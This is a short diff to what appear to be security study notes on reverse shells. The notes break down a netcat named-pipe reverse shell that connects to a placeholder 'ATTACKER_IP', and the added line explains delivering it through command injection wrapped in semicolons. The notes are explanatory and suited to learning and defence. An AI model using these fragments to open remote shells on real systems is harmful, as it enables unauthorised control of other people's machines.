@@ -28,7 +28,7 @@ Commonly referred to as the "connect back shell," it allows an attacker to execu
   - `| sh -i 2>&1`: the data read is piped to a shell instance (`sh -i`) which allows the attacker to execute commands interactively. `2>&1` redirects standard error (STDERR) to standard output (STDOUT), ensuring error messages get sent back to attacker.
   - `| nc ATTACKER_IP ATTACKER PORT`: that is further piped to the attacker's IP and on the attacker's port through netcat
   - `>/tmp/f`: sends the output of the commands back into the named pipe, allowing bi-directional communication
-  - This is run using **COMMAND INJECTION**
+  - This is run using **COMMAND INJECTION**, semicolons added on both sides of the command. (; COMMAND;)
 
 ## Shell Payloads
 
